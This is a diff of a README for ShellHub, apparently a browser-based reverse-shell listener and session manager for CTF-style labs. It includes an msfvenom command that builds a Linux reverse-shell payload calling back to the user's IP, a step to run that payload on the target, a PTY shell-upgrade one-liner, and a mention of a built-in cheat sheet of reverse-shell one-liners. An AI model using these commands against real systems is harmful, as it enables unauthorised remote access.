@@ -11,13 +11,14 @@ Manage multiple shells from your browser — no more juggling terminal windows.
 
 | Feature | Description |
 |---------|-------------|
-| **Web Dashboard** | All sessions visible in one browser UI |
+| **Web Dashboard** | All sessions in one browser UI with live status |
 | **In-Browser Terminal** | Full xterm.js terminal — send commands, see output live |
-| **Session History** | All commands & output saved to SQLite — persists across restarts |
-| **Session Naming** | Double-click to rename sessions (e.g., "THM Pickle Rick") |
-| **Notes & Flags** | Attach notes and captured flags to each session |
+| **Raw Mode** | Toggle for PTY-spawned shells (`python3 -c 'import pty;pty.spawn("/bin/bash")'`) |
+| **Session Persistence** | All output saved to SQLite — survives restarts |
+| **Session Naming** | Double-click to rename sessions (e.g., `THM Pickle Rick`) |
+| **Notes & Flags** | Attach notes & captured flags per session, synced across tabs |
 | **Cheat Sheet** | Built-in reference for payloads, commands, post-exploitation |
-| **Lightweight** | Single Python file, no database setup, no dependencies beyond FastAPI |
+| **Single File** | One Python file, no DB setup, minimal dependencies |
 
 ---
 
@@ -30,21 +31,32 @@ pip install -r requirements.txt
 python shellhub.py
 ```
 
-Open **http://localhost:8080** in your browser.
+Open **http://localhost:8080**.
 
 ---
 
 ## Usage
 
-1. Start ShellHub — it listens for reverse shells on **port 4444**
+1. ShellHub listens for reverse shells on **port 4444**
 2. Generate a payload pointing to your IP on port 4444:
 
    ```bash
-   msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o shell.exe
+   msfvenom -p linux/x86/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o shell.elf
    ```
 
 3. Deliver & run the payload on the target
 4. The session appears in your browser — click to interact
+
+### Raw Mode (PTY)
+
+For interactive shells spawned via PTY:
+
+```bash
+# On the target, after connecting:
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+Then toggle **Raw Mode ON** in the UI — this sends `\r` without converting to `\n`, giving you proper arrow keys, tab completion, and SIGINT (Ctrl+C).
 
 ### Testing locally
 
@@ -58,24 +70,28 @@ nc localhost 4444
 
 ---
 
-## Options
+## Configuration
 
-Configure ports by editing `shellhub.py`:
+Set environment variables to change ports:
 
-- **TCP listener:** line `asyncio.start_server(handle_tcp, "0.0.0.0", 4444)`
-- **Web UI:** line `uvicorn.run(app, host="0.0.0.0", port=8080)`
+| Variable | Default | Description |
+|----------|---------|-------------|
+| `SHELLHUB_HOST` | `0.0.0.0` | Web UI bind address |
+| `SHELLHUB_PORT` | `8080` | Web UI port |
+| `SHELLHUB_TCP_HOST` | `0.0.0.0` | TCP listener bind address |
+| `SHELLHUB_TCP_PORT` | `4444` | TCP listener port |
+
+Example:
+
+```bash
+SHELLHUB_PORT=9090 SHELLHUB_TCP_PORT=5555 python shellhub.py
+```
 
 ---
 
 ## Cheat Sheet
 
-Built-in at [http://localhost:8080/cheatsheet](http://localhost:8080/cheatsheet) — includes:
-
-- MSFVenom payload generation commands
-- Reverse shell one-liners (bash, python, powershell, php, perl)
-- Metasploit listener setup & post-exploitation
-- Linux & Windows enumeration commands
-- Nmap, web scanning, Python HTTP server
+Built-in at [http://localhost:8080/cheatsheet](http://localhost:8080/cheatsheet) — includes MSFVenom payloads, reverse shell one-liners, Metasploit setup, Linux/Windows enumeration, and more.
 
 ---
 
